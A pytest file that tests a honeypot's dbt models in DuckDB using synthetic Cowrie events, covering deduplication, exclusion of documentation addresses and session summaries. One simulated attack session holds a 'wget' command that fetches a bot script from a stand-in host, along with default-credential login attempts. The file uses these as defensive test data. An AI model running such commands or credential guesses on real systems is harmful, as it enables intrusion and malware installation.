"""The honeypot's dbt models, executed in DuckDB against synthetic Bronze rows.

A full `dbt build` needs the Iceberg catalog, and so the Docker stack. These
tests need nothing: they take the REAL model files, replace dbt's `source()`,
`ref()` and macro calls with plain table names, and run the SQL in an
in-memory DuckDB. So the logic tested is the logic that ships.

The synthetic rows use 100.64.0.0/10 (RFC 6598, carrier-grade NAT space),
which is never a public attacker address, plus one RFC 5737 documentation
address that Silver must exclude.
"""

from __future__ import annotations

import hashlib
import json
import re
from datetime import datetime, timedelta, timezone
from pathlib import Path

import duckdb
import pytest

MODELS = Path(__file__).resolve().parents[1] / "dbt" / "models"
START = datetime(2026, 9, 14, 21, 0, 0, tzinfo=timezone.utc)


def render(sql_file: Path, tables: dict[str, str]) -> str:
    """Turn a dbt model into plain SQL, with the same substitutions dbt makes."""
    sql = sql_file.read_text(encoding="utf-8")
    sql = re.sub(
        r"\{\{\s*source\('bronze',\s*'(\w+)'\)\s*\}\}", lambda m: tables[f"source:{m[1]}"], sql
    )
    sql = re.sub(r"\{\{\s*ref\('(\w+)'\)\s*\}\}", lambda m: tables[m[1]], sql)
    # The macro, expanded exactly as dbt/macros/is_documentation_address.sql does.
    sql = re.sub(
        r"\{\{\s*is_documentation_address\('(\w+)'\)\s*\}\}",
        lambda m: (
            f"({m[1]} like '192.0.2.%' or {m[1]} like '198.51.100.%' or {m[1]} like '203.0.113.%')"
        ),
        sql,
    )
    assert "{{" not in sql and "{%" not in sql, f"unrendered Jinja left in {sql_file.name}"
    return sql


def bronze_row(
    con: duckdb.DuckDBPyConnection,
    payload: dict[str, object],
    *,
    ingested_minutes: int = 0,
    offset: int = 0,
) -> None:
    body = json.dumps(payload, sort_keys=True)
    con.execute(
        "INSERT INTO bronze_cowrie VALUES (?, ?, ?, ?, ?, ?, ?)",
        [
            f"evt-{offset}",
            datetime.fromisoformat(str(payload["timestamp"]).replace("Z", "+00:00")),
            START + timedelta(hours=1, minutes=ingested_minutes),
            body,
            hashlib.sha256(body.encode()).hexdigest(),
            "test-host",
            offset,
        ],
    )


def event(
    eventid: str, session: str, second: int, src_ip: str = "100.64.0.10", **fields: object
) -> dict[str, object]:
    return {
        "eventid": eventid,
        "session": session,
        "src_ip": src_ip,
        "sensor": "sensor",
        "timestamp": (START + timedelta(seconds=second)).isoformat().replace("+00:00", "Z"),
        **fields,
    }


@pytest.fixture(scope="module")
def warehouse() -> duckdb.DuckDBPyConnection:
    con = duckdb.connect()
    con.execute(
        """
        CREATE TABLE bronze_cowrie (
            event_id VARCHAR, occurred_at TIMESTAMPTZ, ingested_at TIMESTAMPTZ,
            payload VARCHAR, content_hash VARCHAR, collector_host VARCHAR, _kafka_offset BIGINT
        )
        """
    )

    # Session s1: a complete attack.
    s1 = [
        event("cowrie.session.connect", "s1", 0, protocol="ssh", src_port=51000, dst_port=2222),
        event("cowrie.client.version", "s1", 1, version="SSH-2.0-Go"),
        event("cowrie.client.kex", "s1", 1, hassh="0a07365cc01fa9fc82608ba4019af499"),
        event("cowrie.login.failed", "s1", 2, username="root", password="123456"),
        event("cowrie.login.success", "s1", 3, username="root", password="admin"),
        event("cowrie.command.input", "s1", 5, input="uname -a"),
        event("cowrie.command.input", "s1", 6, input="wget http://100.64.9.9/bot.sh"),
        event(
            "cowrie.session.file_download",
            "s1",
            7,
            url="http://100.64.9.9/bot.sh",
            shasum="ab" * 32,
        ),
        event("cowrie.session.closed", "s1", 8, duration_ms=8000),
    ]
    for index, payload in enumerate(s1):
        bronze_row(con, payload, offset=index)
    # The collector crashed and re-sent one line: identical payload, new event_id, later ingest.
    bronze_row(con, s1[3], ingested_minutes=30, offset=100)

    # Session s2: a documentation address - a test that leaked, never a real attacker.
    bronze_row(
        con,
        event("cowrie.session.connect", "s2", 0, src_ip="203.0.113.9", protocol="ssh"),
        offset=200,
    )
    bronze_row(
        con,
        event(
            "cowrie.login.failed",
            "s2",
            1,
            src_ip="203.0.113.9",
            username="pi",
            password="raspberry",
        ),
        offset=201,
    )

    # Session s3: still open when collected, from an older Cowrie that wrote `duration`.
    bronze_row(
        con,
        event("cowrie.session.connect", "s3", 20, src_ip="100.64.0.11", protocol="telnet"),
        offset=300,
    )
    bronze_row(
        con,
        event(
            "cowrie.login.failed",
            "s3",
            21,
            src_ip="100.64.0.11",
            username="admin",
            password="admin",
        ),
        offset=301,
    )

    # Session s4: closed, legacy `duration` in seconds.
    bronze_row(
        con,
        event("cowrie.session.connect", "s4", 30, src_ip="100.64.0.12", protocol="ssh"),
        offset=400,
    )
    bronze_row(
        con,
        event("cowrie.session.closed", "s4", 34, src_ip="100.64.0.12", duration=3.5),
        offset=401,
    )

    tables = {
        "source:cowrie": "bronze_cowrie",
        "stg_cowrie": "stg_cowrie",
        "honeypot_events": "honeypot_events",
    }
    con.execute(
        "CREATE VIEW stg_cowrie AS " + render(MODELS / "staging" / "stg_cowrie.sql", tables)
    )
    con.execute(
        "CREATE VIEW honeypot_events AS "
        + render(MODELS / "silver" / "honeypot_events.sql", tables)
    )
    con.execute(
        "CREATE VIEW honeypot_sessions AS "
        + render(MODELS / "silver" / "honeypot_sessions.sql", tables)
    )
    return con


def session(con: duckdb.DuckDBPyConnection, session_id: str) -> dict[str, object]:
    cursor = con.execute("SELECT * FROM honeypot_sessions WHERE session_id = ?", [session_id])
    columns = [d[0] for d in cursor.description]
    row = cursor.fetchone()
    assert row is not None, f"session {session_id} missing"
    return dict(zip(columns, row, strict=True))


class TestStaging:
    def test_one_row_per_bronze_row(self, warehouse: duckdb.DuckDBPyConnection) -> None:
        assert warehouse.execute("SELECT count(*) FROM stg_cowrie").fetchone() == (16,)

    def test_both_duration_fields_become_seconds(
        self, warehouse: duckdb.DuckDBPyConnection
    ) -> None:
        rows = dict(
            warehouse.execute(
                "SELECT session_id, duration_seconds FROM stg_cowrie WHERE eventid = 'cowrie.session.closed'"
            ).fetchall()
        )
        assert rows == {"s1": 8.0, "s4": 3.5}


class TestEvents:
    def test_resent_copy_is_removed(self, warehouse: duckdb.DuckDBPyConnection) -> None:
        count = warehouse.execute(
            "SELECT count(*) FROM honeypot_events WHERE session_id = 's1' AND eventid = 'cowrie.login.failed'"
        ).fetchone()
        assert count == (1,)

    def test_first_copy_is_kept(self, warehouse: duckdb.DuckDBPyConnection) -> None:
        kept = warehouse.execute(
            "SELECT source_event_id FROM honeypot_events WHERE session_id = 's1' AND eventid = 'cowrie.login.failed'"
        ).fetchone()
        assert kept == ("evt-3",)

    def test_documentation_addresses_are_excluded(
        self, warehouse: duckdb.DuckDBPyConnection
    ) -> None:
        assert warehouse.execute(
            "SELECT count(*) FROM honeypot_events WHERE session_id = 's2'"
        ).fetchone() == (0,)

    def test_grain_is_unique(self, warehouse: duckdb.DuckDBPyConnection) -> None:
        total, distinct = warehouse.execute(
            "SELECT count(*), count(DISTINCT content_hash) FROM honeypot_events"
        ).fetchone()  # type: ignore[misc]
        assert total == distinct == 13  # 9 + 2 + 2, after removing one copy and session s2


class TestSessions:
    def test_one_row_per_real_session(self, warehouse: duckdb.DuckDBPyConnection) -> None:
        ids = [
            r[0]
            for r in warehouse.execute(
                "SELECT session_id FROM honeypot_sessions ORDER BY 1"
            ).fetchall()
        ]
        assert ids == ["s1", "s3", "s4"]

    def test_complete_attack_is_summarised(self, warehouse: duckdb.DuckDBPyConnection) -> None:
        s1 = session(warehouse, "s1")
        assert s1["src_ip"] == "100.64.0.10"
        assert s1["protocol"] == "ssh"
        assert s1["client_version"] == "SSH-2.0-Go"
        assert s1["hassh"] == "0a07365cc01fa9fc82608ba4019af499"
        assert s1["login_attempts"] == 2  # the re-sent copy is not counted twice
        assert s1["login_succeeded"] is True
        assert s1["distinct_passwords"] == 2
        assert s1["commands_run"] == 2
        assert s1["first_command"] == "uname -a"
        assert s1["downloads"] == 1
        assert s1["is_closed"] is True
        assert s1["duration_seconds"] == 8.0
        assert s1["event_count"] == 9

    def test_open_session_has_no_end_yet(self, warehouse: duckdb.DuckDBPyConnection) -> None:
        s3 = session(warehouse, "s3")
        assert s3["is_closed"] is False
        assert s3["ended_at"] is None
        assert s3["protocol"] == "telnet"
        assert s3["login_succeeded"] is False
        assert s3["commands_run"] == 0
        assert s3["first_command"] is None
